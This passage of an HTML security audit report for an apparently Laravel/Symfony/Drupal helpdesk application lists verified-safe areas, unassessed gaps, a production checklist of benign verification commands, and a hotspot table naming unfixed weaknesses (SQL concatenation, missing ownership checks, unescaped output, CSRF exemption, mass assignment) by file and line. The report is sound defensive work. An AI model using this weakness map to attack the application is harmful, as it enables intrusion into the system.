stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Comments created by the mail webhook (strip_tags before the raw Blade sink)<span class="why">Webhook comment bodies pass through <code>strip_tags</code>, which removes every tag; a lone <code>&lt;</code> followed by whitespace cannot start an element. This path into the <code>{!! !!}</code> sink is not exploitable on its own (the web comment path is injection-107). · <code>app/Http/Controllers/MailWebhookController.php:20</code></span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Server-side template injection, checked as the XSS sibling of injection-107, injection-111 and chain-901 (Blade, Twig, Drupal render arrays)<span class="why">Every template is chosen by a constant name and compiled from a file; request data and stored data reach templates only as variables, never as template source. Drupal output uses a fixed <code>#theme</code> and <code>t()</code> with <code>@</code> placeholders. The XSS findings are output-escaping problems, not template compilation of user data. · <code>app/Http/Controllers/TicketController.php:34</code></span></div></li></ul></details><details class="cat"><summary>Headers, CORS, build &amp; deploy configuration <span>1</span></summary><ul class="good"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Debug mode default and public health/status routes<span class="why"><code>APP_DEBUG</code> defaults to false in config (the <code>true</code> in <code>.env.example</code> is for local setup); billing <code>/health</code> and portal <code>/portal/status</code> return only static JSON. · <code>config/app.php:6</code></span></div></li></ul></details><details class="cat"><summary>Cryptography <span>1</span></summary><ul class="good"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Mail webhook signature verification (with a configured secret), app cipher, password hashing<span class="why">HMAC-SHA256 over the raw body compared with <code>hash_equals</code> (constant time); app cipher AES-256-CBC (Laravel&#39;s authenticated encryption); passwords cast <code>hashed</code>; Symfony password hasher <code>auto</code>. (Empty-secret fail-open is crypto-117.) · <code>app/Http/Controllers/MailWebhookController.php:12-16</code></span></div></li></ul></details><details class="cat"><summary>File upload &amp; storage <span>1</span></summary><ul class="good"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="9" r="7.2"/><path d="M5.8 9.2l2.2 2.2 4.2-4.6"/></svg><div>Avatar upload (POST /account/avatar)<span class="why">Validated as <code>image</code> with a <code>jpg,png,webp</code> allow-list and 2 MB limit; <code>store()</code> generates a random name with an extension derived from the detected MIME type, so no client-controlled name or extension reaches the public disk. (The route&#39;s CSRF exemption is auth-105.) · <code>app/Http/Controllers/ProfileController.php:28-33</code></span></div></li></ul></details></div>
+
+<h2 id="gaps">Not assessed</h2>
+<p class="lede">Nobody checked these. They are unknown, not safe.</p>
+<div class="band-gap"><ul class="gap"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>CVE scan</strong><span class="why">no composer.lock in the root or billing/; osv-scanner had nothing to read · dependency</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>login and API throttling</strong><span class="why">bootstrap/app.php, login routes (Laravel auth, Symfony app_login, Drupal) and server config are not in the repo · rate-limit</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>security event logging</strong><span class="why">no logging config (config/logging.php, monolog) in the repo · logging</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>security headers, session cookie flags, CORS</strong><span class="why">config/session.php, config/cors.php, web server and Drupal settings.php/services.yml are not in the repo; framework defaults assumed · config</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>templates not in repo</strong><span class="why">tickets/index, admin/*, account/edit, layouts.app, invoice/index.html.twig, base.html.twig are referenced but missing · injection</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>helpdesk_ticket sync between Laravel and Drupal</strong><span class="why">writer of the Drupal helpdesk_ticket table (last_reply, cc_mail) is not in the repo · auth</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true" stroke-dasharray="2.2 2.4"><circle cx="9" cy="9" r="7.2"/></svg><div><strong>semgrep rule scan (p/php)</strong><span class="why">NOT RUN: semgrep not installed and docker unavailable; to enable: `pipx install semgrep` or `brew install semgrep`, or a running docker (pulls semgrep/semgrep:1.179.0, pinned by digest) (prepass) · code</span></div></li></ul></div>
+
+<h2 id="prod">Production checklist</h2>
+<p class="lede">Deployment and runtime checks the code audit cannot settle. Items marked &quot;from this audit&quot; come from rows under Not Assessed; the baseline items apply to any production deploy. Each says how to verify it on your own host; none of them changes anything.</p>
+
+<ul class="gap prod"><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Security headers</strong> <span class="chip chip-warn">From this audit</span><span class="why">Not assessed: config · security headers, session cookie flags, CORS (config/session.php, config/cors.php, web server and Drupal settings.php/services.yml are not in the repo; framework defaults assumed)</span><span class="how">How to check: <code>curl -sI https://&lt;your-host&gt;/</code> and look for <code>Content-Security-Policy</code>, <code>Strict-Transport-Security</code>, <code>X-Content-Type-Options: nosniff</code>, <code>frame-ancestors</code> (or <code>X-Frame-Options</code>) and <code>Referrer-Policy</code>. Repeat on an API route and on an error page; a CDN or proxy can add or strip them.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Request size, upload and rate limits</strong> <span class="chip chip-warn">From this audit</span><span class="why">Not assessed: rate-limit · login and API throttling (bootstrap/app.php, login routes (Laravel auth, Symfony app_login, Drupal) and server config are not in the repo)</span><span class="how">How to check: Write down the limits the deployment actually applies: reverse-proxy body size (e.g. <code>client_max_body_size</code>), the framework&#39;s body parser limit, the upload maximum, the login throttle. On staging, with your own test account, confirm an oversized upload is refused (413) and repeated failed logins get throttled.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Logging, monitoring and alerts</strong> <span class="chip chip-warn">From this audit</span><span class="why">Not assessed: logging · security event logging (no logging config (config/logging.php, monolog) in the repo)</span><span class="how">How to check: On staging, cause a harmless error (a 404, a failed login with your own test account) and confirm it reaches the log store with a timestamp and request id, and without passwords, tokens or session ids. Confirm someone is alerted on a burst of 5xx responses or failed logins.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Dependency and runtime updates</strong> <span class="chip chip-warn">From this audit</span><span class="why">Not assessed: dependency · CVE scan (no composer.lock in the root or billing/; osv-scanner had nothing to read)</span><span class="how">How to check: Run the ecosystem&#39;s audit on the lockfile that is deployed (<code>npm audit --omit=dev</code>, <code>composer audit</code>, <code>pip-audit</code>). Check that the runtime and base image versions in production are still supported, and that update pull requests (Dependabot, Renovate) have an owner.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Session cookie flags</strong> <span class="chip chip-warn">From this audit</span><span class="why">Not assessed: config · security headers, session cookie flags, CORS (config/session.php, config/cors.php, web server and Drupal settings.php/services.yml are not in the repo; framework defaults assumed)</span><span class="how">How to check: Sign in on https://&lt;your-host&gt;/ with your own account and read the <code>Set-Cookie</code> header (browser devtools or <code>curl -sI</code>): the session cookie has <code>Secure</code>, <code>HttpOnly</code> and <code>SameSite=Lax</code> or <code>Strict</code>.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>TLS and HTTPS redirect</strong> <span class="chip chip-muted">Baseline</span><span class="how">How to check: <code>curl -sI http://&lt;your-host&gt;/</code> should answer with a redirect to <code>https://</code>. <code>openssl s_client -connect &lt;your-host&gt;:443 -servername &lt;your-host&gt; &lt;/dev/null | openssl x509 -noout -dates</code> shows the certificate expiry; confirm renewal is automated.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Environment variables and debug flags</strong> <span class="chip chip-muted">Baseline</span><span class="how">How to check: List the variables the code reads (search for <code>process.env</code>, <code>getenv</code>, <code>os.environ</code>) and confirm each one is set in production with a non-default value. Debug is off (<code>NODE_ENV=production</code>, <code>APP_DEBUG=false</code>, <code>DEBUG=False</code>), and an error page on https://&lt;your-host&gt;/ shows no stack trace.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Secrets storage and rotation</strong> <span class="chip chip-muted">Baseline</span><span class="how">How to check: Production secrets live in the platform&#39;s secret store, not in the repository or the image: run <code>gitleaks detect</code> over the full git history and check <code>docker history &lt;image&gt;</code> for baked-in values. Rotate any value that was ever committed, and check who can read the secret store.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Backups and a tested restore</strong> <span class="chip chip-muted">Baseline</span><span class="how">How to check: Check the time of the last backup and that it is stored off the production host. Restore it into a scratch database, compare row counts of the main tables with production, and note how long the restore took.</span></div></li><li><svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><rect x="2.5" y="2.5" width="13" height="13" rx="3"/></svg><div><strong>Exposed services and ports</strong> <span class="chip chip-muted">Baseline</span><span class="how">How to check: In the hosting provider&#39;s firewall or security-group view, only 80 and 443 are public for &lt;your-host&gt;; the database, cache, queue and admin ports are bound to a private network. Repeat after every infrastructure change.</span></div></li></ul>
+<p class="empty">3 other not-assessed row(s) are code checks rather than deployment checks; they stay under Not assessed.</p>
+
+<h2 id="hotspots">Hotspots</h2>
+<p class="lede">Where the audit started: entry points and configuration ranked by risk signals. A ranking, not a verdict.</p>
+<div class="tablewrap"><table><thead><tr><th>#</th><th>Score</th><th>Where</th><th>Why</th></tr></thead><tbody><tr><td>1</td><td><span class="score" style="width:36px"></span>9</td><td class="mono where">portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:1<br>drupal-route helpdesk_portal.tickets</td><td>SQL/DQL string built by concatenation; Markup::create on dynamic content skips Drupal&#39;s XSS filtering; #markup built from a variable; handler: portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:13</td></tr><tr><td>2</td><td><span class="score" style="width:28px"></span>7</td><td class="mono where">portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:9<br>drupal-route helpdesk_portal.ticket_json</td><td>open to everyone (_access: &#39;TRUE&#39;); record loaded by id without an ownership or policy check; handler: portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:38</td></tr><tr><td>3</td><td><span class="score" style="width:24px"></span>6</td><td class="mono where">billing/src/Controller/InvoiceController.php:27<br>symfony-route GET</td><td>payments area; SQL/DQL string built by concatenation; handler: billing/src/Controller/InvoiceController.php:28</td></tr><tr><td>4</td><td><span class="score" style="width:24px"></span>6</td><td class="mono where">billing/src/Controller/InvoiceController.php:37<br>symfony-route GET</td><td>payments area; record loaded by id without an ownership or policy check; handler: billing/src/Controller/InvoiceController.php:38</td></tr><tr><td>5</td><td><span class="score" style="width:24px"></span>6</td><td class="mono where">routes/api.php:12<br>laravel-route GET</td><td>files area; no auth middleware on the route or its groups; handler: app/Http/Controllers/ReportController.php:23</td></tr><tr><td>6</td><td><span class="score" style="width:20px"></span>5</td><td class="mono where">routes/web.php:23<br>laravel-route POST</td><td>files area; upload stored under the client&#39;s file name; handler: app/Http/Controllers/AttachmentController.php:10</td></tr><tr><td>7</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:14<br>laravel-route POST</td><td>webhooks area; no auth middleware; signature check seen in the handler; handler: app/Http/Controllers/MailWebhookController.php:10</td></tr><tr><td>8</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:17<br>laravel-route GET</td><td>raw SQL with request data interpolated (Eloquent *Raw / DB::); handler: app/Http/Controllers/TicketController.php:11</td></tr><tr><td>9</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:19<br>laravel-route GET</td><td>record loaded by id without an ownership or policy check; handler: app/Http/Controllers/TicketController.php:30</td></tr><tr><td>10</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:26<br>laravel-route POST</td><td>request input written to the model as-is (mass assignment); handler: app/Http/Controllers/ProfileController.php:14</td></tr><tr><td>11</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:31<br>laravel-route GET</td><td>admin area; handler: app/Http/Controllers/Admin/UserController.php:10</td></tr><tr><td>12</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:32<br>laravel-route DELETE</td><td>admin area; handler: app/Http/Controllers/Admin/UserController.php:15</td></tr><tr><td>13</td><td><span class="score" style="width:16px"></span>4</td><td class="mono where">routes/web.php:33<br>laravel-route GET</td><td>admin area; handler: app/Http/Controllers/ReportController.php:10</td></tr><tr><td>14</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">app/Http/Middleware/VerifyCsrfToken.php:16<br>config VerifyCsrfToken.php</td><td>CSRF verification skipped for &quot;account/*&quot;</td></tr><tr><td>15</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">app/Models/User.php:13<br>model User.php</td><td>$guarded = []: every column is mass assignable</td></tr><tr><td>16</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">billing/config/routes.yaml:7<br>symfony-route GET</td><td>payments area; health/status route; handler: billing/src/Controller/HealthController.php:9</td></tr><tr><td>17</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">billing/src/Controller/InvoiceController.php:17<br>symfony-route GET</td><td>payments area; handler: billing/src/Controller/InvoiceController.php:18</td></tr><tr><td>18</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">billing/src/Controller/InvoiceController.php:45<br>symfony-route GET</td><td>payments area; handler: billing/src/Controller/InvoiceController.php:46</td></tr><tr><td>19</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">portal/web/modules/custom/helpdesk_portal/helpdesk_portal.routing.yml:17<br>drupal-route helpdesk_portal.close</td><td>changes state on GET without _csrf_token; handler: portal/web/modules/custom/helpdesk_portal/src/Controller/PortalController.php:47</td></tr><tr><td>20</td><td><span class="score" style="width:12px"></span>3</td><td class="mono where">resources/views/tickets/show.blade.php:20<br>template show.blade.php</td><td>unescaped Blade output {!! $comment-&gt;body !!}</td></tr></tbody></table></div>
+
+<h2 id="deps">Dependencies</h2>
+<p class="lede">no lockfile found</p>
+<p class="empty">No vulnerable packages reported.</p>
+
+<h2 id="secrets">Secrets</h2>
+<p class="lede">gitleaks: 0 hits, 1 commits of this repo. Values are redacted; anything real that was ever committed must be rotated.</p>
+<p class="empty">No secrets found.</p>
+
+<h2 id="filtered">Filtered out</h2>
+<p class="lede">Candidates the verifier rejected after reading the code. Kept for the record; none of them needs action.</p>
+<p class="empty">Nothing was rejected.</p>
+</main>
+<footer>Generated from <code>.security-audit/</code> by report-html.mjs. Names unfixed weaknesses with file and line: keep it private, never publish or commit it. A public page must redact unfixed findings (see public_safe in remediation.json).</footer>
+</div>
+<script>addEventListener("beforeprint",()=>document.querySelectorAll("details").forEach((d)=>d.open=true));</script>
+</body>
+</html>
